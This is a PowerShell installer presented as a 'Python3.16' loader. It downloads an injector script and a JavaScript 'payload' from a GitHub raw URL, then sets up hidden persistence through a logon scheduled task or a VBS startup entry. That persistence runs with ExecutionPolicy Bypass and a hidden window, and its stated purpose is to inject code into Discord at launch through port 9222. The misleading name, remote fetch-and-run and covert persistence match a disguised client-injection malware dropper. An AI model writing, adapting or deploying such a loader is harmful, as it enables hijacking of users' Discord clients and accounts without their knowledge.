[CmdletBinding()]
param(
    [string]$RawBase = 'https://raw.githubusercontent.com/testkgj/python316-client/main',
    [int]$Port = 9222,
    [switch]$NoStartNow,
    [switch]$NoTask
)

$ErrorActionPreference = 'Stop'
$TaskName   = 'Python316 Injector'
$InstallDir = Join-Path $env:LOCALAPPDATA 'Python316'

function Say($m, $c = 'Gray') { Write-Host $m -ForegroundColor $c }

Say '===========================================' 'Cyan'
Say '   Python3.16 - Loader Setup               ' 'Cyan'
Say '===========================================' 'Cyan'

# ---------------------------------------------------------------- bootstrap
if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }

function Fetch($name, $dest) {
    $u = '{0}/{1}?t={2}' -f $RawBase, $name, [DateTime]::UtcNow.Ticks
    Say "  downloading $name"
    Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -OutFile $dest
}

$localInjector = Join-Path $PSScriptRoot 'injector.ps1'
$localConfig   = Join-Path $PSScriptRoot 'config.json'
$localMain     = Join-Path $PSScriptRoot 'main.js'

$dstInjector = Join-Path $InstallDir 'injector.ps1'
$dstConfig   = Join-Path $InstallDir 'config.json'
$dstMain     = Join-Path $InstallDir 'main.js'

# injector.ps1
if (Test-Path $localInjector) {
    if ((Resolve-Path $localInjector).Path -ne (Resolve-Path $dstInjector -ErrorAction SilentlyContinue).Path) {
        Copy-Item $localInjector $dstInjector -Force
    }
} else {
    Fetch 'injector.ps1' $dstInjector
}
Say "  injector -> $dstInjector" 'DarkGray'

# config.json
if (Test-Path $localConfig) {
    Copy-Item $localConfig $dstConfig -Force
} elseif (-not (Test-Path $dstConfig)) {
    $cfg = [ordered]@{
        port             = $Port
        githubRaw        = "$RawBase/main.js"
        autoLaunch       = $true
        restartExisting  = $true
        pollSeconds      = 6
    }
    $cfg | ConvertTo-Json | Set-Content -LiteralPath $dstConfig -Encoding UTF8
}
Say "  config   -> $dstConfig" 'DarkGray'

# seed payload cache (so first run works even if GitHub is blocked afterwards)
if (Test-Path $localMain) {
    Copy-Item $localMain $dstMain -Force
} else {
    try { Fetch 'main.js' $dstMain } catch { Say "  payload cache skipped: $($_.Exception.Message)" 'Yellow' }
}
Say "  payload  -> $dstMain" 'DarkGray'

# ---------------------------------------------------------------- scheduled task
$startupVbs = Join-Path ([Environment]::GetFolderPath('Startup')) 'Python316.vbs'
$psExe      = (Get-Command powershell.exe).Source
$argLine    = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector

$registered = $false
if (-not $NoTask) {
    try {
        $action   = New-ScheduledTaskAction -Execute $psExe -Argument $argLine
        $trigger  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit ([TimeSpan]::Zero)
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Description 'Injects Python3.16 into Discord at launch' -Force | Out-Null
        $registered = $true
        Say "  scheduled task registered: $TaskName" 'Green'
    } catch {
        Say "  scheduled task failed ($($_.Exception.Message)); using Startup folder" 'Yellow'
    }

    if (-not $registered) {
        $vbsLines = @(
            'Set sh = CreateObject("WScript.Shell")',
            ('sh.Run "{0} {1}", 0, False' -f $psExe, ($argLine -replace '"', '""'))
        )
        Set-Content -LiteralPath $startupVbs -Value $vbsLines -Encoding ASCII
        Say "  startup entry -> $startupVbs" 'Green'
    }
}

# ---------------------------------------------------------------- start now
if (-not $NoStartNow) {
    Say ''
    Say 'Starting the watcher (attaches / restarts Discord once if needed)...' 'Cyan'
    if ($registered) {
        try {
            Start-ScheduledTask -TaskName $TaskName
            Say '  watcher started via scheduled task.' 'Green'
        } catch {
            Say "  could not start task ($($_.Exception.Message)); launching directly" 'Yellow'
            Start-Process -FilePath $psExe -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector) -WindowStyle Hidden | Out-Null
        }
    } else {
        Start-Process -FilePath $psExe -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector) -WindowStyle Hidden | Out-Null
        Say '  watcher started.' 'Green'
    }
    Start-Sleep -Seconds 2
} else {
    Say ''
    Say 'Skipped immediate attach (-NoStartNow). It will run at next Discord launch / logon.' 'Yellow'
}

Say ''
Say 'DONE. Python3.16 is installed.' 'Green'
Say "  install dir : $InstallDir"
Say "  task name   : $TaskName"
Say "  payload url : $RawBase/main.js"
Say ''
Say 'Uninstall: run uninstall.ps1 from this folder.' 'DarkGray'
